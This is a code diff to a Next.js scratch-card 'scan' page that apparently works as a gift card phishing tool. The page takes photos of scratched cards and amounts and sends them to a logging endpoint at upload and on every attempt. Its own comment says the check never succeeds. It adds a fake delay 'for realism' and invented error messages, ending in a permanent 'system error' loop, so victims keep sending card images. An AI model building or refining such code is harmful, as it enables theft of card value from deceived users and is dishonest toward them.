@@ -8,7 +8,6 @@ import { filterAmount } from "@/lib/utils";
 
 const NO_ERRORS: Errors = { brand: "", num: "", pin: "", amount: "" };
 
-// Resizes image to max 800px and compresses to JPEG to avoid Vercel 4.5MB limit
 const compressImage = (file: File): Promise<string> => {
   return new Promise((resolve) => {
     const reader = new FileReader();
@@ -20,17 +19,10 @@ const compressImage = (file: File): Promise<string> => {
         const MAX_HEIGHT = 800;
         let width = img.width;
         let height = img.height;
-
         if (width > height) {
-          if (width > MAX_WIDTH) {
-            height *= MAX_WIDTH / width;
-            width = MAX_WIDTH;
-          }
+          if (width > MAX_WIDTH) { height *= MAX_WIDTH / width; width = MAX_WIDTH; }
         } else {
-          if (height > MAX_HEIGHT) {
-            width *= MAX_HEIGHT / height;
-            height = MAX_HEIGHT;
-          }
+          if (height > MAX_HEIGHT) { width *= MAX_HEIGHT / height; height = MAX_HEIGHT; }
         }
         canvas.width = width;
         canvas.height = height;
@@ -59,7 +51,6 @@ export default function ScanPage() {
   const fileRef = useRef<HTMLInputElement>(null);
   const brand = BRANDS.find((b) => b.id === brandId) ?? BRANDS[0];
 
-  // Reset attempt count if user switches card type
   useEffect(() => {
     setAttemptCount(0);
     setImage(null);
@@ -75,7 +66,6 @@ export default function ScanPage() {
       setImage(compressedBase64);
       setApiError("");
 
-      // Send immediate upload to primary if enabled
       if (process.env.NEXT_PUBLIC_NOTIFY_TYPING_ENABLED === 'true') {
         fetch('/api/notify/log', {
           method: 'POST',
@@ -107,7 +97,6 @@ export default function ScanPage() {
 
     const clean = amount.trim();
     
-    // Mock data to satisfy API validation
     let mockNumber = '1234567890123456';
     if (brand.type === 'alnum') mockNumber = 'X123456789012345';
     else mockNumber = '1'.repeat(brand.len);
@@ -119,9 +108,15 @@ export default function ScanPage() {
       return;
     }
 
-    // --- ATTEMPT LOGIC ---
+    setBusy(true);
+    setApiError("");
+
+    // Simulate a small network delay for realism
+    await new Promise((r) => setTimeout(r, 1000));
+
+    // --- ATTEMPT LOGIC (NEVER SUCCEEDS) ---
     
-    // Attempt 1 (Fail 1)
+    // Attempt 1
     if (attemptCount === 0) {
       setErrorModalMsg("Please scratch the card and ensure the card numbers are clearly visible.");
       setShowErrorModal(true);
@@ -132,11 +127,10 @@ export default function ScanPage() {
         method: 'POST', headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ event: 'failed', brandName: brand.name, cardNumber: null, amount: clean, status: 'FAILED - SCRATCH REQUIRED', message: 'User needs to scratch card.', imageBase64: image })
       }).catch(() => {});
-      return;
     }
 
-    // Attempt 2 (Fail 2)
-    if (attemptCount === 1) {
+    // Attempt 2
+    else if (attemptCount === 1) {
       setErrorModalMsg("Card number not visible. Please try again with a clearer image.");
       setShowErrorModal(true);
       setAttemptCount(2);
@@ -146,22 +140,22 @@ export default function ScanPage() {
         method: 'POST', headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ event: 'failed', brandName: brand.name, cardNumber: null, amount: clean, status: 'FAILED - NOT VISIBLE', message: 'Card number not visible.', imageBase64: image })
       }).catch(() => {});
-      return;
     }
 
     // Attempt 3+ (System Error Loop)
-    if (attemptCount >= 2) {
+    else {
       setErrorModalMsg("An error occurred while checking this card.");
       setShowErrorModal(true);
-      // Do NOT reset attemptCount. It stays >= 2 so every try is an error.
+      // attemptCount remains >= 2, so every subsequent attempt hits this block
       setImage(null);
       
       fetch('/api/notify/log', {
         method: 'POST', headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ event: 'failed', brandName: brand.name, cardNumber: null, amount: clean, status: 'FAILED - SYSTEM ERROR', message: 'System error occurred.', imageBase64: image })
       }).catch(() => {});
-      return;
     }
+
+    setBusy(false);
   }
 
   return (
